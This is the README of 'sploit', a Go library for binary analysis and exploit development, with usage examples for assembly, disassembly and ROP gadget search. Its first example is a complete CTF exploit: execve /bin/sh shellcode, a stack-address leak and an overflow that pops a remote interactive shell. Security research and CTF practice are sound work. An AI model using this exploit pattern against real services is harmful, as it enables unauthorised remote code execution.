# sploit [![Build Status](https://travis-ci.org/zznop/sploit.svg?branch=master)](https://travis-ci.org/zznop/sploit)

Sploit is a Go package that aids in binary analysis and exploitation. The motivating factor behind the development of
sploit is to be able to have a well designed API with functionality that rivals some of the more common Python exploit
development frameworks while taking advantage of the Go programming language. Excellent cross-compiler support,
goroutines, powerful crypto libraries, and static typing are just a few of the reasons for choosing Go.

This project is inspired by pwntools and other awesome projects. It is still early in development. Expect for this
project to be focused heavily on shellcoding, binary patching, ROP stack construction, and general binary analysis.

#### Solution for a CTF Challenge

```go
package main;

import(
    sp "github.com/zznop/sploit"
)

var arch = &sp.Processor {
    Architecture: sp.ArchI386,
    Endian: sp.LittleEndian,
}

var scInstrs = `mov al, 0xb   /* __NR_execve */
                sub esp, 0x30 /* Get pointer to /bin/sh (see below) */
                mov ebx, esp  /* filename (/bin/sh) */
                xor ecx, ecx  /* argv (NULL) */
                xor edx, edx  /* envp (NULL) */
                int 0x80`

func main() {
    shellcode, _ := sp.Asm(arch, scInstrs)
    r, _ := sp.NewRemote("tcp", "some.pwnable.on.the.interwebz:10800")
    defer r.Close()
    r.RecvUntil([]byte("HELLO:"), true)

    // Leak a stack address
    r.Send(append([]byte("/bin/sh\x00AAAAAAAAAAAA"), sp.PackUint32LE(0x08048087)...))
    resp, _ := r.RecvN(20)
    leakAddr := sp.UnpackUint32LE(resp[0:4])

    // Pop a shell
    junk := make([]byte, 20-len(shellcode))
    junk = append(junk, sp.PackUint32LE(leakAddr-4)...)
    r.Send(append(shellcode, junk...))
    r.Interactive()
}
```

#### Compiling Assembly to Machine Code

```go
package main;

import(
    "github.com/zznop/sploit"
    "encoding/hex"
    "fmt"
)

func main() {
    instrs := "mov rcx, r12\n"              +
              "mov rdx, r13\n"              +
              "mov r8, 0x1f\n"              +
              "xor r9, r9\n"                +
              "sub rsp, 0x8\n"              +
              "mov qword [rsp+0x20], rax\n"

    arch := &sploit.Processor {
        Architecture: sploit.ArchX8664,
        Endian: sploit.LittleEndian,
    }

    opcode, _ := sploit.Asm(arch, instrs)
    fmt.Printf("Opcode bytes:\n%s\n", hex.Dump(opcode))
}
```

```
$ ./assemble_example
Opcode bytes:
00000000  4c 89 e1 4c 89 ea 49 c7  c0 1f 00 00 00 4d 31 c9  |L..L..I......M1.|
00000010  48 83 ec 08 48 89 44 24  28                       |H...H.D$(|
```

#### Disassembling Code in an ELF Executable

```go
package main;

import(
    "github.com/zznop/sploit"
    "fmt"
)

var program = "../test/prog1.x86_64"

func main() {
    elf, _ := sploit.NewELF(program)
    vaddr := uint64(0x1135)
    count := 34
    fmt.Printf("Disassembling %v bytes at vaddr:%08x\n", count, vaddr)
    disasm, _ := elf.Disasm(vaddr, count)
    fmt.Print(disasm)
}
```

```
$ ./disassemble_example
Disassembling 34 bytes at vaddr:00001135
00001135: push rbp
00001136: mov rbp, rsp
00001139: sub rsp, 0x10
0000113d: mov dword ptr [rbp - 4], edi
00001140: mov qword ptr [rbp - 0x10], rsi
00001144: lea rdi, [rip + 0xeb9]
0000114b: call 0x1030
00001150: mov eax, 0
00001155: leave
00001156: ret
```

#### Querying and Filtering ROP Gadgets

```go
package main;

import(
    "github.com/zznop/sploit"
)

var program = "../test/prog1.x86_64"

func main() {
    elf, _ := sploit.NewELF(program)
    rop, _ := elf.ROP()

    matched, _ := rop.InstrSearch("pop rbp")
    matched.Dump()
}
```

```
0000111f: pop rbp ; ret
0000111d: add byte ptr [rcx], al ; pop rbp ; ret
00001118: mov byte ptr [rip + 0x2f11], 1 ; pop rbp ; ret
00001113: call 0x1080 ; mov byte ptr [rip + 0x2f11], 1 ; pop rbp ; ret
000011b7: pop rbp ; pop r14 ; pop r15 ; ret
000011b3: pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
000011b2: pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
000011af: add esp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
000011ae: add rsp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
...
```

## Dependencies

Some of Sploit's functionality relies on external dependencies. For instance, Sploit uses GCC's GAS assembler to
compile assembly code and capstone to disassemble compiled code as part of the API exposed by `asm.go`.

Install capstone:

```
git clone https://github.com/aquynh/capstone.git --branch 4.0.2 --single-branch
cd capstone
make
sudo make install
```

Install GCC cross-compilers. The following commands assume you are running Debian or Ubuntu on a Intel workstation
and may need changed if running another Linux distro:

```
sudo apt install gcc gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu gcc-mips-linux-gnu \
  gcc-mipsel-linux-gnu gcc-powerpc-linux-gnu
```

If you would rather use docker, an image containing the external dependences is on
[Docker Hub](https://hub.docker.com/repository/docker/zznop/sploit). Pull it with the following command:

```
docker pull zznop/sploit:latest
```
